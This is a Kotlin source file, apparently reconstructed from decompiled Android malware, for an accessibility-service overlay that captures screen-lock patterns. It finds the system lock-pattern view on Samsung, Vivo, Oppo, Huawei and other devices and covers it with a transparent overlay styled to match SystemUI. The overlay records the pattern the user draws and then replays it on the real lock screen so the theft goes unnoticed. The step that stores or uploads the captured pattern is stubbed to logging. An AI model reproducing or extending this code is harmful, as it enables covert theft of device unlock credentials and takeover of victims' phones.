package com.storm.safe.rock.service.modules.cipher

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.content.pm.PackageManager
import android.content.res.Resources
import android.graphics.Color
import android.graphics.Path
import android.graphics.PointF
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference
import java.util.concurrent.locks.ReentrantLock
import okhttp3.OkHttpClient

/**
 * 图案密码捕获悬浮层 — 覆盖系统图案锁 UI 捕获手势。
 *
 * JADX: C0337a3.java (1048 行)
 * 方法映射:
 *   a0 → replayGesture          (手势回放)
 *   a1 → saveCipherToLocalService (保存图案到本地)
 *   a2 → applyBrandStyle         (应用品牌样式)
 *   a3 → adjustCoordinates       (坐标修正)
 *   a4 → createPatternView       (创建图案视图)
 *   a5 → getThemeColor           (获取主题颜色)
 *   a6 → findPatternNodeById     (通过 ID 查找图案节点)
 *   a7 → findSystemPatternView   (查找系统图案锁)
 *   a8 → isCapturing             (是否正在捕获)
 *   a9 → readSystemUiResources   (读取 SystemUI 资源)
 *   b0 → removePatternView       (移除图案视图)
 *   b1 → stopCapture             (停止捕获)
 */
class PatternCaptureOverlay(
    val service: AccessibilityService,
    val context: Context
) {

    companion object {
        private const val TAG = "PatternCaptureOverlay"

        /** 单例实例 */
        @Volatile
        var instance: PatternCaptureOverlay? = null

        /** 缓存的 SystemUI 样式 */
        @Volatile
        var cachedStyle: PatternStyleConfig? = null

        /** 系统图案锁资源 ID 列表 */
        val PATTERN_VIEW_IDS = listOf(
            "com.android.systemui:id/lockPattern",
            "com.android.settings:id/lockPattern",
            "com.samsung.android.biometrics.app.setting:id/lockPattern",
            "com.android.systemui:id/biometric_lockPattern",
            "com.android.settings:id/biometric_lockPattern",
            "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern"
        )
    }

    // ==================== 字段 ====================

    /** 图案视图引用 */
    private val patternViewRef: AtomicReference<PatternLockView?> = AtomicReference(null)

    /** 操作锁 */
    val lock: ReentrantLock = ReentrantLock()

    /** 已捕获的屏幕坐标 */
    val capturedPoints: ArrayList<PointF> = ArrayList()

    /** 备用视图引用 */
    private val alternateViewRef: AtomicReference<Any?> = AtomicReference(null)

    /** WindowManager */
    private var windowManager: WindowManager? = null

    /** 是否正在回放手势 */
    @Volatile
    var isReplaying: Boolean = false

    /** 图案锁屏幕边界 */
    var patternBoundsInScreen: Rect? = null

    /** 图案锁父级边界 */
    var patternBoundsInParent: Rect? = null

    /** 捕获状态: 0=空闲, 1=捕获中 */
    var captureState: Int = 0

    /** 图案完成回调 */
    var onPatternCaptured: ((List<Int>, List<PointF>, Rect?, Rect?) -> Unit)? = null

    /** 停止回调 */
    var onCaptureStopped: (() -> Unit)? = null

    /** OkHttp 客户端 */
    private val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(5L, TimeUnit.SECONDS)
        .readTimeout(5L, TimeUnit.SECONDS)
        .build()

    /** Handler */
    val handler: Handler = Handler(Looper.getMainLooper())

    init {
        windowManager = context.getSystemService("window") as? WindowManager
    }

    // ==================== 公共方法 ====================

    /**
     * 手势回放 — 将捕获的图案路径在系统锁屏上重放。
     * vendor: a0
     */
    fun replayGesture(points: ArrayList<PointF>): Boolean {
        val reversed = points.reversed()
        if (reversed.size < 2) {
            Log.w(TAG, "图案点数不足，跳过重放")
            return false
        }
        return try {
            val path = Path()
            path.moveTo(reversed[0].x, reversed[0].y)
            for (i in 1 until reversed.size) {
                path.lineTo(reversed[i].x, reversed[i].y)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 10L, 300L))
                .build()
            val result = service.dispatchGesture(gesture, null, null)
            Log.d(TAG, "手势重放已分发: result=$result, points=${reversed.size}")
            result
        } catch (e: Exception) {
            Log.e(TAG, "replayGestureOnSystemSync error: ${e.message}")
            false
        }
    }

    /**
     * 应用品牌特定样式到图案视图。
     * vendor: a2
     */
    fun applyBrandStyle(view: PatternLockView) {
        val dotAlign = DotAlign.ALIGN_CENTER
        val style = cachedStyle ?: readSystemUiResources()
        if (style != null) {
            cachedStyle = style
            view.normalStateColor = style.dotColor
            view.dotSelectedColor = style.dotColor
            view.correctStateColor = style.dotColor
            view.dotNormalSize = style.haloSize
            view.dotSelectedSize = style.dotSelectedSize
            view.innerDotSize = style.innerDotSize
            view.outerCircleAlpha = style.outerCircleAlpha
            view.pathWidth = style.pathWidth
            view.pathColor = style.pathColor

            val brand = Build.BRAND.lowercase(Locale.ROOT)
            view.aspectRatio = if (brand == "oppo" || brand == "realme" || brand == "oneplus") 1 else 0
            view.setDotAlign(dotAlign)
            view.dotAnimationDuration = 150
            view.pathEndAnimationDuration = 100
            return
        }

        // 兜底: 品牌适配
        Log.w(TAG, "SystemUI资源不可用，使用品牌兜底参数")
        val themeColor = getThemeColor()
        val density = Resources.getSystem().displayMetrics.density
        val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
        val brand = Build.BRAND

        // ADAPT: 简化品牌分支，保留核心逻辑
        when {
            brand.equals("samsung", ignoreCase = true) -> {
                view.normalStateColor = -3355444
                view.correctStateColor = -3355444
                view.dotSelectedColor = -3355444
                view.dotNormalSize = 36
                view.dotSelectedSize = 50
                view.pathWidth = 10
                view.pathColor = -1
                view.aspectRatio = 0
            }
            else -> {
                view.normalStateColor = themeColor
                view.correctStateColor = themeColor
                view.dotNormalSize = 30
                view.dotSelectedSize = 60
                view.dotSelectedColor = themeColor
                view.pathWidth = pathWidth
                view.pathColor = themeColor
                view.aspectRatio = 0
            }
        }
        view.setDotAlign(dotAlign)
        view.dotAnimationDuration = 150
        view.pathEndAnimationDuration = 100
    }

    /**
     * 坐标修正（双屏适配）。
     * vendor: a3
     */
    fun adjustCoordinates(rect: Rect) {
        val screenWidth = context.resources.displayMetrics.widthPixels
        if (screenWidth <= 0 || rect.left <= 0 || rect.left < screenWidth) return
        val leftOffset = rect.left - screenWidth
        rect.left = leftOffset
        val rightOffset = rect.right - screenWidth
        rect.right = rightOffset
        Log.d(TAG, "坐标已修正: left=$leftOffset, right=$rightOffset")
    }

    /**
     * 创建图案视图并添加到 WindowManager。
     * vendor: a4
     */
    fun createPatternView() {
        try {
            val bounds = findSystemPatternView() ?: run {
                Log.w(TAG, "未找到系统图案锁")
                return
            }

            capturedPoints.clear()
            patternBoundsInScreen = bounds.boundsInScreen
            patternBoundsInParent = bounds.boundsInParent
            val rect = bounds.boundsInScreen

            val layoutParams = WindowManager.LayoutParams().apply {
                flags = 4786090
                format = 1
                alpha = 1.0f
                dimAmount = 0.05f
                gravity = Gravity.START or Gravity.TOP
                x = rect.left
                y = rect.top
                width = rect.width()
                height = rect.height()
                type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            }

            val view = PatternLockView(context).apply {
                aspectRatioEnabled = true
                inputEnabled = true
                dotCount = 3
            }
            applyBrandStyle(view)
            view.systemUiVisibility = 4
            view.importantForAccessibility = 2
            if (Build.VERSION.SDK_INT >= 30) {
                view.setImportantForContentCapture(2)
            }
            view.setBackgroundColor(0)
            view.isFocusable = true
            view.isFocusableInTouchMode = true
            view.filterTouchesWhenObscured = false

            // 设置图案完成回调
            view.onPatternComplete = { points ->
                if (lock.tryLock()) {
                    try {
                        capturedPoints.clear()
                        capturedPoints.addAll(points)
                        val pattern = view.getSelectedPattern()
                        Log.d(TAG, "★ onPatternComplete: indices=${pattern.joinToString("-")}, points=${points.size}")
                        // 重置视图
                        removePatternView()
                        isReplaying = true
                        // 通知回调
                        onPatternCaptured?.invoke(pattern, ArrayList(points), patternBoundsInScreen, patternBoundsInParent)
                    } finally {
                        lock.unlock()
                    }
                } else {
                    Log.w(TAG, "★ onPatternComplete: tryLock 失败，跳过")
                }
            }

            if (windowManager == null) {
                windowManager = context.getSystemService("window") as? WindowManager
            }
            if (patternViewRef.get() == null) {
                windowManager?.addView(view, layoutParams)
                patternViewRef.set(view)
                Log.d(TAG, "patternLockView 创建完成")
            }
        } catch (e: Exception) {
            Log.e(TAG, "createPatternView error: ${e.message}")
        }
    }

    /**
     * 获取主题颜色（深色/浅色模式）。
     * vendor: a5
     */
    fun getThemeColor(): Int {
        val isDark = (context.resources.configuration.uiMode and 48) == 32
        val color = if (isDark) 0x66FFFFFF.toInt() else 0x4D000000.toInt()
        Log.d(TAG, "★ 主题检测: isDarkMode=$isDark → 颜色=#${Integer.toHexString(color)}")
        return color
    }

    /**
     * 通过资源 ID 查找图案锁节点。
     * vendor: a6
     */
    fun findPatternNodeById(root: AccessibilityNodeInfo, viewId: String): PatternBounds? {
        try {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
            if (nodes.isNullOrEmpty()) return null
            val node = nodes[0]

            val screenRect = Rect()
            node.getBoundsInScreen(screenRect)
            adjustCoordinates(screenRect)

            val parentRect = Rect()
            node.getBoundsInParent(parentRect)

            if (screenRect.width() <= 50 || screenRect.height() <= 50) {
                Log.d(TAG, "跳过无效 bounds: $viewId, bounds=$screenRect (太小)")
                for (n in nodes) { try { n.recycle() } catch (_: Exception) {} }
                return null
            }

            patternBoundsInScreen = screenRect
            Log.d(TAG, "找到图案锁: $viewId, boundsInScreen=$screenRect, boundsInParent=$parentRect")
            for (n in nodes) { try { n.recycle() } catch (_: Exception) {} }
            return PatternBounds(screenRect, parentRect)
        } catch (e: Exception) {
            Log.e(TAG, "findPatternNodeById($viewId) error: ${e.message}")
            return null
        }
    }

    /**
     * 查找系统图案锁 View。
     * vendor: a7
     */
    fun findSystemPatternView(): PatternBounds? {
        try {
            val root = service.rootInActiveWindow ?: return null

            // 通用 ID 搜索
            for (id in PATTERN_VIEW_IDS) {
                val found = findPatternNodeById(root, id)
                if (found != null) return found
            }

            // 品牌特定 ID
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            return when {
                brand == "oppo" || brand == "realme" || brand == "oneplus" ->
                    findPatternNodeById(root, "com.android.systemui:id/colorLockPatternView")
                brand == "vivo" || brand == "iqoo" ->
                    findPatternNodeById(root, "com.android.systemui:id/vivo_lock_pattern_view")
                else ->
                    findPatternNodeById(root, "com.android.systemui:id/lockPatternView")
            }
        } catch (e: Exception) {
            Log.e(TAG, "findSystemPatternView error: ${e.message}")
            return null
        }
    }

    /**
     * 是否正在捕获。
     * vendor: a8
     */
    fun isCapturing(): Boolean {
        return (patternViewRef.get() != null && windowManager != null) || isReplaying
    }

    /**
     * 读取 SystemUI 资源（点大小、颜色等）。
     * vendor: a9
     *
     * 从 com.android.systemui 包中读取图案锁样式资源。
     * 支持: AOSP, Huawei, Vivo, OPPO, Samsung, Xiaomi
     */
    fun readSystemUiResources(): PatternStyleConfig? {
        try {
            val suiContext = context.createPackageContext("com.android.systemui", Context.CONTEXT_INCLUDE_CODE)
            val res = suiContext.resources
            val density = Resources.getSystem().displayMetrics.density
            val brand = Build.BRAND.lowercase(Locale.ROOT)

            // 读取点大小
            var dotSize = 0
            var haloSize = 0
            var innerDot = 0
            var pathWidth = 0

            when {
                brand == "vivo" || brand == "iqoo" -> {
                    val selectId = res.getIdentifier("vivo_keyguard_select_point_width", "dimen", "com.android.systemui")
                    val springId = res.getIdentifier("vivo_keyguard_spring_patten_point_width", "dimen", "com.android.systemui")
                    val pathId = res.getIdentifier("vivo_keyguard_path_width", "dimen", "com.android.systemui")

                    innerDot = when {
                        selectId != 0 -> res.getDimensionPixelSize(selectId)
                        springId != 0 -> res.getDimensionPixelSize(springId)
                        else -> (8 * density).toInt()
                    }
                    haloSize = (innerDot * 2.5f).toInt()
                    pathWidth = if (pathId != 0) res.getDimensionPixelSize(pathId) else 0
                }
                brand == "huawei" || brand == "honor" -> {
                    val huaweiIds = listOf("hwlock_pattern_dot_size", "hw_pattern_dot_size", "hw_lock_pattern_dot_size", "keyguard_pattern_dot_size")
                    for (name in huaweiIds) {
                        val id = res.getIdentifier(name, "dimen", "com.android.systemui")
                        if (id != 0) {
                            dotSize = res.getDimensionPixelSize(id)
                            break
                        }
                    }
                    if (dotSize > 0) {
                        haloSize = dotSize * 3
                        innerDot = dotSize
                    } else {
                        innerDot = (11 * density).toInt()
                        haloSize = (32 * density).toInt()
                    }
                }
                else -> {
                    val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
                    if (aospId != 0) {
                        dotSize = res.getDimensionPixelSize(aospId)
                        haloSize = dotSize * 3
                        innerDot = dotSize
                    } else {
                        return null
                    }
                }
            }

            // 选中大小
            val activatedId = res.getIdentifier("lock_pattern_dot_size_activated", "dimen", "com.android.systemui")
            val dotSelected = if (activatedId != 0) res.getDimensionPixelSize(activatedId) else (haloSize * 1.5f).toInt()

            // 路径宽度
            if (pathWidth == 0) {
                val lineWidthId = res.getIdentifier("lock_pattern_dot_line_width", "dimen", "com.android.systemui")
                pathWidth = if (lineWidthId != 0) res.getDimensionPixelSize(lineWidthId) else (density * 3f).toInt().coerceAtLeast(3)
            }

            // 外圈透明度
            var outerAlpha = 0.1f
            // ADAPT: OPPO 特定 alpha 资源省略

            // 颜色
            var dotColor = 0
            var pathColor = 0
            // ADAPT: 品牌特定颜色资源读取省略，使用主题兜底
            if (dotColor == 0) dotColor = getThemeColor()
            if (pathColor == 0) pathColor = getThemeColor()

            return PatternStyleConfig(haloSize, innerDot, dotSelected, dotColor, pathColor, pathWidth, outerAlpha)
        } catch (e: Exception) {
            Log.w(TAG, "读取SystemUI资源失败: ${e.message}")
            return null
        }
    }

    /**
     * 移除图案视图。
     * vendor: b0
     */
    fun removePatternView() {
        try {
            val view = patternViewRef.get()
            if (windowManager != null && view != null) {
                Log.d(TAG, "removeViewImmediate patternView")
                windowManager?.removeViewImmediate(view)
                view.onPatternComplete = null
            }
            alternateViewRef.set(null)
            patternViewRef.set(null)
            Log.d(TAG, "isPatternListening: ${isCapturing()}")
        } catch (e: Exception) {
            Log.e(TAG, "removePatternView error: ${e.message}")
        }
    }

    /**
     * 停止捕获。
     * vendor: b1
     */
    fun stopCapture(save: Boolean) {
        if (!lock.tryLock()) return
        try {
            if (save) {
                // ADAPT: VENDOR_VERIFY — 保存逻辑: vendor saves captured pattern points to CipherDataHolder
                // then triggers dispatchResult on CipherCaptureManager. Simplified: log only.
                Log.d(TAG, "stopCapture: 保存 ${capturedPoints.size} 个已捕获点")
            } else {
                Log.d(TAG, "stopCapture: 不保存，丢弃已捕获点")
            }
            capturedPoints.clear()
            isReplaying = false
            if (Looper.myLooper() == Looper.getMainLooper()) {
                removePatternView()
            } else {
                handler.post { removePatternView() }
            }
        } catch (e: Exception) {
            Log.e(TAG, "stopCapture error: ${e.message}")
        } finally {
            lock.unlock()
        }
        Log.d(TAG, "isPatternListening: ${isCapturing()}")
    }
}
